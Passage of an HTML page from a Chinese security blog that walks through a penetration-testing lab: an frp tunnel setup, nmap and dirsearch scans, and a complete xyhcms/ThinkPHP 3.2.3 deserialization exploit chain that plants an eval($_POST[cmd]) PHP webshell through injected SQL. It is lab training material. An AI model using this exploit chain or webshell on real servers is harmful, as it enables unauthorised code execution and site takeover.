@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            外网打点到内网域靶场-scanner |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"The price of doing the same old thing is far higher than the price of change."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">外网打点到内网域靶场-scanner</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2023-10-23 13:50:30</span>
+        <span class="mobile">2023-10-23 13:50</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">完整渗透测试靶场</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93GetShell/">数据库GetShell</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CVE-2020-1472/">CVE-2020-1472</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/xyhcms%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">xyhcms反序列化</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%AE%9D%E5%A1%94disfunction%E7%BB%95%E8%BF%87/">宝塔disfunction绕过</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.2k 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h1><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="/2023/10/23/scanner/image-20240129001406581.png" alt="image-20240129001406581"></p>
+<p>PS：该靶场作者：<a class="link" target="_blank" rel="noopener" href="https://www.moonsec.com/">暗月<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="VSP设置"><a href="#VSP设置" class="headerlink" title="VSP设置"></a>VSP设置</h2><p>这里用192.168.0.1&#x2F;24网段代替外网，VPS地址为192.168.0.208。</p>
+<p>服务端：</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frps.toml</span></span><br><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br><span class="line">192.168.188.141</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;192.168.0.208&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp1&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">80</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp2&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">8888</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp3&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">888</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">888</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp4&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">3306</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">3306</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> sudo nmap -sT -sV -O 192.168.0.208</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org )</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.208</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE              VERSION</span><br><span class="line">22/tcp   open  ssh                  OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http                 Apache httpd</span><br><span class="line">888/tcp  open  http                 Apache httpd</span><br><span class="line">3306/tcp open  mysql                MySQL 5.5.62-<span class="built_in">log</span></span><br><span class="line">7000/tcp open  ssl/afs3-fileserver?</span><br><span class="line">8888/tcp open  http                 nginx</span><br><span class="line">MAC Address: 00:0C:29:6F:46:67 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: 0b842aa5.phpmyadmin</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 64.69 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.208/&quot;</span> -e php,htm,js,bak,zip,tar.gz,tgz,txt -i 200-399      </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, htm, js, bak, zip, tar.gz, tgz, txt | HTTP method: GET | Threads: 30 | Wordlist size: 12473</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/.dirsearch/reports/192.168.0.208.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/kali/.dirsearch/logs/errors.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.0.208/</span><br><span class="line"></span><br><span class="line">[06:55:20] Starting: </span><br><span class="line">[06:55:21] 200 -   11KB - /%3f/                                          </span><br><span class="line">[06:55:43] 200 -   11KB - /0                                              </span><br><span class="line">[06:55:48] 301 -  296B  - /App  -&gt;  http://192.168.0.208/App/             </span><br><span class="line">[06:55:52] 301 -  300B  - /Install  -&gt;  http://192.168.0.208/Install/     </span><br><span class="line">[06:55:54] 200 -  350B  - /Public/                                        </span><br><span class="line">[06:55:55] 200 -    4KB - /Search                                         </span><br><span class="line">[06:56:46] 200 -    5KB - /archive                                        </span><br><span class="line">[06:56:56] 200 -    1KB - /cgi-bin/test-cgi                               </span><br><span class="line">[06:57:18] 200 -    5KB - /favicon.ico                                    </span><br><span class="line">[06:57:23] 200 -    0B  - /go                                             </span><br><span class="line">[06:57:26] 200 -   11KB - /home                                           </span><br><span class="line">[06:57:26] 200 -   11KB - /home.tgz</span><br><span class="line">[06:57:26] 200 -   11KB - /home.htm</span><br><span class="line">[06:57:26] 200 -   11KB - /home.bak</span><br><span class="line">[06:57:26] 200 -   11KB - /home.tar</span><br><span class="line">[06:57:26] 200 -   11KB - /home.js</span><br><span class="line">[06:57:26] 200 -   11KB - /home.rar</span><br><span class="line">[06:57:26] 200 -   11KB - /home.php</span><br><span class="line">[06:57:26] 200 -   11KB - /home.zip</span><br><span class="line">[06:57:26] 200 -   11KB - /home.html                                      </span><br><span class="line">[06:57:26] 200 -   11KB - /home.txt                                       </span><br><span class="line">[06:57:29] 200 -   11KB - /index                                          </span><br><span class="line">[06:57:29] 200 -  383B  - /index2</span><br><span class="line">[06:57:30] 200 -   11KB - /index.php                                      </span><br><span class="line">[06:57:30] 200 -   11KB - /index.html                                     </span><br><span class="line">[06:57:42] 302 -    0B  - /member  -&gt;  /index.php?s=/Home/Public/login.html </span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.htm  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.js  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.jsp  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/signin  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.txt  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.tgz  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.html  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.asp  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.php  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/admin.asp  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.rb  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/logon  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.bak  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.zip  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:42] 302 -    0B  - /member/login.py  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:43] 302 -    0B  - /member/login.tar.gz  -&gt;  /index.php?s=/Home/Public/login.html</span><br><span class="line">[06:57:44] 200 -    7KB - /mobile.php                                     </span><br><span class="line">[06:57:45] 200 -    7KB - /mobile                                         </span><br><span class="line">[06:57:45] 200 -    7KB - /mobile.zip</span><br><span class="line">[06:57:45] 200 -    7KB - /mobile.js</span><br><span class="line">[06:57:45] 200 -    7KB - /mobile.htm</span><br><span class="line">[06:57:45] 200 -    7KB - /mobile.bak                                     </span><br><span class="line">[06:57:45] 200 -    7KB - /mobile.tgz                                     </span><br><span class="line">[06:57:45] 200 -    7KB - /mobile.txt                                     </span><br><span class="line">[06:58:07] 200 -    0B  - /review                                         </span><br><span class="line">[06:58:10] 200 -    4KB - /search                                         </span><br><span class="line">[06:58:13] 200 -    3KB - /show                                           </span><br><span class="line">[06:58:17] 200 -    4KB - /special                                        </span><br><span class="line">[06:58:27] 200 -  352B  - /uploads/                                       </span><br><span class="line">[06:58:27] 301 -  300B  - /uploads  -&gt;  http://192.168.0.208/uploads/     </span><br><span class="line">                                                                           </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/23/scanner/image-20240129001428863.png" alt="image-20240129001428863"></p>
+<p><img src="/2023/10/23/scanner/image-20240129001434995.png" alt="image-20240129001434995"></p>
+<p><img src="/2023/10/23/scanner/image-20240129001440945.png" alt="image-20240129001440945"></p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="xyhcms反序列化"><a href="#xyhcms反序列化" class="headerlink" title="xyhcms反序列化"></a>xyhcms反序列化</h3><p>代码审计文章：<a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232823">xyhcms（Thinkphp3.2.3）反序列化<i class="fas fa-external-link-alt"></i></a>。</p>
+<p>序列化payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">        PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;dsn&quot;</span>    =&gt; <span class="string">&quot;mysql:host=127.0.0.1;dbname=www_xycms_com;port=3306&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;9a973fd7928bb3c2&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">\Think\Db\Driver\Mysql</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;luoke&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;xyh_admin_log&quot;</span>,</span><br><span class="line">            <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;id=0; alter table xyh_guestbook add column `&lt;script language=&#x27;php&#x27;&gt;eval(\$_POST[cmd]);&lt;/script&gt;` varchar(10);&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">\Think\Model</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">\Think\Session\Driver\Memcache</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Common</span>\<span class="title class_">Lib</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SysCrypt</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$crypt_key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypt_key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; crypt_key = <span class="variable">$crypt_key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">php_encrypt</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">srand</span>((<span class="keyword">double</span>)<span class="title function_ invoke__">microtime</span>() * <span class="number">1000000</span>);</span><br><span class="line">        <span class="variable">$encrypt_key</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">32000</span>));</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypt_key</span>) ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">            <span class="variable">$tmp</span> .= <span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>].(<span class="variable">$txt</span>[<span class="variable">$i</span>]^<span class="variable">$encrypt_key</span>[<span class="variable">$ctr</span>++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">__key</span>(<span class="variable">$tmp</span>,<span class="variable">$this</span> -&gt; crypt_key));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">php_decrypt</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$txt</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">__key</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$txt</span>),<span class="variable">$this</span> -&gt; crypt_key);</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span 